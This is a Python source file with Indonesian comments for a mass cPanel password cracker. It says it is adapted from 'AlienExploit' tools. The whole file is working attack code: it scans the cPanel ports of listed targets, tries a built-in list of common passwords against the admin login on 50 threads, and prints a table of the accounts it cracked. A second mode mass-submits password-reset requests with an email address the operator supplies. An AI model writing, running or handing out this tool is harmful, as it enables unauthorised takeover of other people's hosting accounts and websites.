#!/usr/bin/env python3
"""
CPANEL CRACKER MODULE v1.0
===========================
cPanel brute force dan reset password checker
Diadaptasi dari AlienExploit Tool14 & Tool16
"""

import requests
import re
import json
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
}

# cPanel ports
CPANEL_PORTS = [2082, 2083, 2086, 2087, 2095, 2096]

# Default cPanel passwords
CPANEL_PASSWORDS = [
    'admin', 'password', 'admin123', 'admin1234', 'admin12345', 'admin123456',
    '123456', '12345678', '123456789', '1234567890', 'qwerty', 'abc123',
    'admin@123', 'admin@2023', 'admin@2024', 'P@ssw0rd', 'p@ssw0rd',
    'cpanel', 'cpanel123', 'root', 'toor', 'test', 'demo', 'guest',
    'administrator', 'admin2023', 'admin2024', 'pass123', 'pass1234',
    'letmein', 'welcome', 'monkey', 'dragon', 'master', 'login',
    'user', 'user123', 'test123', 'demo123', 'root123', 'admin1',
    'admin2', 'admin3', 'admin4', 'admin5', 'admin6', 'admin7', 'admin8',
    'admin9', 'admin0', 'admin11', 'admin12', 'admin13', 'admin14', 'admin15',
    'password1', 'password123', 'password1234', 'password12345', 'password123456',
    '1234', '12345', '1234567', '1234567890', '123123', '123321',
    '654321', '666666', '7777777', '888888', '999999', '000000',
    'iloveyou', 'trustno1', 'sunshine', 'princess', 'football', 'baseball',
    'shadow', 'superman', 'batman', 'starwars', 'whatever', 'freedom',
]


class CPanelCracker:
    """cPanel brute force dan reset password checker."""
    
    def __init__(self):
        self.cracked = []
        self.lock = threading.Lock()
    
    def crack(self, target, username='admin'):
        """Crack single cPanel target."""
        target = target.strip().rstrip('/')
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Find cPanel port
        cpanel_url = None
        for port in CPANEL_PORTS:
            try:
                url = f'{target}:{port}'
                r = requests.get(url, timeout=5, headers=HEADERS, verify=False, allow_redirects=True)
                if 'cPanel' in r.text or 'cpanel' in r.text.lower() or r.status_code == 200:
                    cpanel_url = url
                    break
            except:
                pass
        
        if not cpanel_url:
            return False, target, None, None
        
        console.print(f"  [cyan]cPanel found: {cpanel_url} | Username: {username}[/cyan]")
        
        for passwd in CPANEL_PASSWORDS:
            try:
                # cPanel login
                sess = requests.session()
                r = sess.post(f'{cpanel_url}/login/', data={
                    'user': username,
                    'pass': passwd,
                }, headers=HEADERS, timeout=10, verify=False)
                
                if 'cPanel' in r.text and 'logout' in r.text.lower():
                    console.print(f"  [green]✓ cPanel CRACKED: {cpanel_url} | {username}:{passwd}[/green]")
                    with self.lock:
                        self.cracked.append({
                            'url': cpanel_url,
                            'username': username,
                            'password': passwd
                        })
                    return True, cpanel_url, username, passwd
            except:
                pass
        
        return False, target, None, None
    
    def crack_mass(self, targets, username='admin', threads=50):
        """Crack multiple cPanel targets."""
        console.print(f"\n[bold cyan]MASS CPANEL CRACKER[/bold cyan]")
        console.print(f"  Targets: {len(targets)}")
        console.print(f"  Username: {username}")
        console.print(f"  Threads: {threads}")
        
        results = []
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Cracking cPanel...", total=len(targets))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.crack, t, username): t for t in targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        success, url, user, passwd = future.result()
                        if success:
                            with self.lock:
                                results.append({
                                    'url': url,
                                    'username': user,
                                    'password': passwd
                                })
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]CPANEL CRACKER COMPLETE[/bold green]")
        console.print(f"  Cracked: {len(results)}")
        
        if results:
            table = Table(title="Cracked cPanel")
            table.add_column("URL", width=40)
            table.add_column("Username", width=15)
            table.add_column("Password", width=15)
            for r in results:
                table.add_row(r['url'], r['username'], r['password'])
            console.print(table)
        
        return results
    
    def reset_password_check(self, target, email):
        """Check if cPanel password reset is available."""
        target = target.strip().rstrip('/')
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            # Try password reset
            r = requests.get(f'{target}/resetpass', timeout=10, headers=HEADERS, verify=False)
            if r.status_code == 200:
                # Try to submit reset
                r = requests.post(f'{target}/resetpass', data={
                    'email': email,
                    'submit': 'Submit'
                }, headers=HEADERS, timeout=10, verify=False)
                
                if 'sent' in r.text.lower() or 'reset' in r.text.lower():
                    return True, target, 'RESET_AVAILABLE'
        except:
            pass
        
        return False, target, 'RESET_NOT_AVAILABLE'
    
    def reset_password_mass(self, targets, email, threads=50):
        """Check password reset availability untuk multiple targets."""
        console.print(f"\n[bold cyan]MASS CPANEL RESET PASSWORD CHECK[/bold cyan]")
        console.print(f"  Targets: {len(targets)}")
        console.print(f"  Email: {email}")
        console.print(f"  Threads: {threads}")
        
        results = []
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Checking reset...", total=len(targets))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.reset_password_check, t, email): t for t in targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        success, url, status = future.result()
                        if success:
                            with self.lock:
                                results.append({
                                    'url': url,
                                    'status': status
                                })
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]RESET PASSWORD CHECK COMPLETE[/bold green]")
        console.print(f"  Available: {len(results)}")
        
        if results:
            table = Table(title="Reset Password Available")
            table.add_column("URL", width=50)
            table.add_column("Status", width=20)
            for r in results:
                table.add_row(r['url'], r['status'])
            console.print(table)
        
        return results


def main():
    import argparse
    parser = argparse.ArgumentParser(description="cPanel Cracker")
    parser.add_argument("-l", "--list", help="Target list file")
    parser.add_argument("-t", "--target", help="Single target")
    parser.add_argument("-u", "--username", default="admin", help="Username")
    parser.add_argument("--mode", default="crack", choices=["crack", "reset"], help="Mode")
    parser.add_argument("-e", "--email", help="Email for reset mode")
    parser.add_argument("--threads", type=int, default=50)
    args = parser.parse_args()
    
    targets = []
    if args.list:
        with open(args.list) as f:
            targets = [l.strip() for l in f if l.strip()]
    elif args.target:
        targets = [args.target]
    else:
        console.print("[red]Error: Specify -l list.txt or -t target[/red]")
        return
    
    cracker = CPanelCracker()
    
    if args.mode == 'crack':
        cracker.crack_mass(targets, args.username, args.threads)
    else:
        if not args.email:
            console.print("[red]Error: Reset mode requires -e email[/red]")
            return
        cracker.reset_password_mass(targets, args.email, args.threads)


if __name__ == "__main__":
    main()
